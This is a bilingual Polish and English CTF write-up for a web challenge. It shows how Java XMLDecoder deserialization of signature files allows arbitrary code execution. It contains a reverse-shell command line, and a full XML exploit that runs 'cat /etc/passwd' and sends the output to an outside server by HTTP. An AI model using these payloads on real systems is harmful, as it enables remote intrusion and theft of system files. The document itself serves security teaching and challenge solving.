## Sign server (Web, 100p)

	Document signature is so hot right now! 
	SignServer provides you with the most advanced solution to sign and verify your documents. 
	We support any document types and provide you with a unique, ultra-secure signature.

### PL
[ENG](#eng-version)

W zadaniu dostępna jest strona, która generuje podpis dla wybranego przez nas pliku, oraz pozwala na weryfikacje takiego podpisu.
Istotny fakt jest taki, że pliki z podpisem wyglądają tak:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
 <object class="models.CTFSignature" id="CTFSignature0">
  <void class="models.CTFSignature" method="getField">
   <string>hash</string>
   <void method="set">
    <object idref="CTFSignature0"/>
    <string>da39a3ee5e6b4b0d3255bfef95601890afd80709</string>
   </void>
  </void>
  <void class="models.CTFSignature" method="getField">
   <string>sig</string>
   <void method="set">
    <object idref="CTFSignature0"/>
    <string>12a626d7c85bcc21d9f35302e33914104d8329a0</string>
   </void>
  </void>
 </object>
</java>
```

Można więc zauważyć, że serialiazcja obiektu z podpisem, oraz zapewne deserializacja wykorzystaują klasy XMLEncoder i XMLDecoder.
Występuje tu podatność podobna do Pythonowego Pickle - deserializacja jest w stanie wykonywać praktycznie dowolny kod, o ile plik zostanie odpowiednio przygotowany.

Możemy na przykład utworzyć dowolny obiekt używając tagu `<object>` a następnie podając parametry konstruktora, na przykład:

```xml
<object class = "java.io.PrintWriter">
	<string>reverse.sh</string>
</object>
```
Wykona `new PrintWriter("reverse.sh");`

Możemy też wykonywać dowolne metody na takim obiekcie za pomocą tagów `<method>` oraz `<void>` i tak na przykład:

```xml
<object class = "java.io.PrintWriter">
	<string>reverse.sh</string>
	<method name = "write">
		<string>bash -i >& /dev/tcp/1.2.3.4/1234 0>&1</string>
	</method>
	<method name = "close"/>
</object>
```

Wykona kod:

```java
PrintWriter p = new PrintWriter("reverse.sh");
p.write("bash -i >& /dev/tcp/1.2.3.4/1234 0>&1");
p.close();
```

tym samym tworząc na serwerze plik z podaną zawartością.

Możemy także nadawać "id" tworzonym obiektom i używać ich jako parametrów dla innych obiektów.

```xml
<void class="java.lang.String" id="someString">
    <string>some data</string>
</void>
<object class = "java.io.PrintWriter">
	<string>reverse.sh</string>
	<method name = "write">
		<object idref="someString"/>
	</method>
	<method name = "close"/>
</object>
```

Mając takie możliwości przygotowaliśmy exploita który pozwalał nam na wykonanie dowolnego kodu na zdalnej maszynie, a wynik przekazywał jako parametr GET wysłany po http do naszego serwera:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_72-internal" class="java.beans.XMLDecoder">

    <void class="java.lang.String" id="command" method="valueOf">
        <object class="java.lang.StringBuilder" id="builder">
            <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="2">
                    <void index="0">
                        <string>cat</string>
                    </void>
                    <void index="1">
                        <string>/etc/passwd</string>
                    </void>
                </array>
                <void method="start" id="process">
                    <void method="getInputStream" id="stream" />
                </void>
                <void class="java.io.BufferedReader" id="bufferedReader">
                    <object class="java.io.InputStreamReader">
                        <object idref="stream"/>
                    </object>
                    <void method="lines" id="lines">
                        <void method="collect" id="collected">
                            <object class="java.util.stream.Collectors" method="joining">
								<string>      </string>
							</object>
                        </void>
                    </void>
                </void>
            </void>
            <void method="append">
                <string>http://our.server.net/exp/</string>
            </void>
            <void method="append">
                <object idref="collected"/>
            </void>
        </object>
    </void>

    <object class="java.net.URL">
        <object idref="command"/>
        <void method="openStream"/>
    </object>
</java>
```

Dzięki temu mogliśmy użyć komendy `find` aby znaleźć plik `flag` a potem wypisać go przez `cat` i uzyskać `flag{ser1l1azati0n_in_CTF_is_fUN}`

### ENG version

In the task there is a webpage which generates a signature for a selected file, and lets us verify the signature.
It is important to notice that signature files are:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
 <object class="models.CTFSignature" id="CTFSignature0">
  <void class="models.CTFSignature" method="getField">
   <string>hash</string>
   <void method="set">
    <object idref="CTFSignature0"/>
    <string>da39a3ee5e6b4b0d3255bfef95601890afd80709</string>
   </void>
  </void>
  <void class="models.CTFSignature" method="getField">
   <string>sig</string>
   <void method="set">
    <object idref="CTFSignature0"/>
    <string>12a626d7c85bcc21d9f35302e33914104d8329a0</string>
   </void>
  </void>
 </object>
</java>
```

And therefore the signature object serialization, and probably deserialization, is handled by XMLEncoder and XMLDecoder.
They have the same type of vulnerability as Python Pickle - deserialization can execute any code as long as the input file is properly prepared.

For example we can create any object using `<object>` tag and then pass the constructor arguments to it, eg:

```xml
<object class = "java.io.PrintWriter">
	<string>reverse.sh</string>
</object>
```

Will execute `new PrintWriter("reverse.sh");`

We can also call any methods on such objects using `<method>` and `<void>` tags, and therefore:

```xml
<object class = "java.io.PrintWriter">
	<string>reverse.sh</string>
	<method name = "write">
		<string>bash -i >& /dev/tcp/1.2.3.4/1234 0>&1</string>
	</method>
	<method name = "close"/>
</object>
```

Will execute code:

```java
PrintWriter p = new PrintWriter("reverse.sh");
p.write("bash -i >& /dev/tcp/1.2.3.4/1234 0>&1");
p.close();
```

creating a file on the server with given contents.

We can also assign "id" to the objects and then use them as parameters of other objects:

```xml
<void class="java.lang.String" id="someString">
    <string>some data</string>
</void>
<object class = "java.io.PrintWriter">
	<string>reverse.sh</string>
	<method name = "write">
		<object idref="someString"/>
	</method>
	<method name = "close"/>
</object>
```

With such capability we created an exploit which lets us execute any code on target machine, and the results are send with http GET request to our server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_72-internal" class="java.beans.XMLDecoder">

    <void class="java.lang.String" id="command" method="valueOf">
        <object class="java.lang.StringBuilder" id="builder">
            <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="2">
                    <void index="0">
                        <string>cat</string>
                    </void>
                    <void index="1">
                        <string>/etc/passwd</string>
                    </void>
                </array>
                <void method="start" id="process">
                    <void method="getInputStream" id="stream" />
                </void>
                <void class="java.io.BufferedReader" id="bufferedReader">
                    <object class="java.io.InputStreamReader">
                        <object idref="stream"/>
                    </object>
                    <void method="lines" id="lines">
                        <void method="collect" id="collected">
                            <object class="java.util.stream.Collectors" method="joining">
								<string>      </string>
							</object>
                        </void>
                    </void>
                </void>
            </void>
            <void method="append">
                <string>http://our.server.net/exp/</string>
            </void>
            <void method="append">
                <object idref="collected"/>
            </void>
        </object>
    </void>

    <object class="java.net.URL">
        <object idref="command"/>
        <void method="openStream"/>
    </object>
</java>
```

With this we could use `find` command to look for `flag` file and then print it using `cat` and get `flag{ser1l1azati0n_in_CTF_is_fUN}`
